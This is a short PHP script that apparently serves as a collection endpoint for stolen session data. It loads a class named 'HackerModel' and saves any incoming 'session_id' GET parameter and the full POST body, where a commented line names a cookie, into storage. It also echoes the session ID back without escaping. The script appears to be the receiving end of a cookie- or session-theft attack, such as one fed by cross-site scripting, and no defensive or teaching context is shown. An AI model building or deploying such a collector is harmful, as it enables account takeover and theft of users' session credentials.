<?php
require_once 'models/HackerModel.php';
$inputsession = new HackerModel;

if (isset($_GET['session_id'])) {
    echo $_GET['session_id'];
    $inputsession->insertUser($_GET['session_id']);
}

if (isset($_POST)) {
   // echo $_POST['cookie'];
    $inputsession->insertUser((json_encode($_POST)));
}